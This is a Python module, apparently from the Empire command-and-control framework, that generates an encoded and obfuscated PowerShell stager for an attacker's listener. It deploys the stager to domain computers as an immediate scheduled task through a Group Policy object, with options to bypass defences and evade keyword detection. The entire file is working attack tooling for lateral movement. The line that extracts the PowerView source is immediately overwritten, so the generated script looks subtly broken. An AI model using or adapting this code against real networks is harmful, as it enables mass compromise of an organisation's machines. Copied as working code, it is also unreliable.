from __future__ import print_function

from builtins import str
from builtins import object

from empire.server.utils import data_util
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        module_name = 'New-GPOImmediateTask'
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        ObfuscateCommand = params['ObfuscateCommand']

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""

        else:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           obfuscate=obfuscate, obfuscationCommand=ObfuscateCommand,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                           bypasses=params['Bypasses'])

            command = "/c \"" + launcher + "\""

            if command == "":
                return ""

            else:

                # read in the common powerview.ps1 module source code
                module_source = main_menu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
                try:
                    f = open(module_source, 'r')
                except:
                    print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
                    return ""

                module_code = f.read()
                f.close()

                # get just the code needed for the specified function
                script = helpers.generate_dynamic_powershell_script(module_code, module_name)

                script = module_name + " -Command cmd -CommandArguments '" + command + "' -Force"

                for option, values in params.items():
                    if option.lower() in ["taskname", "taskdescription", "taskauthor", "gponame", "gpodisplayname",
                                          "domain", "domaincontroller"]:
                        if values and values != '':
                            if values.lower() == "true":
                                # if we're just adding a switch
                                script += " -" + str(option)
                            else:
                                script += " -" + str(option) + " '" + str(values) + "'"

                script += ' | Out-String | %{$_ + \"`n\"};"`n' + str(module_name) + ' completed!"'

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script,
                                       obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
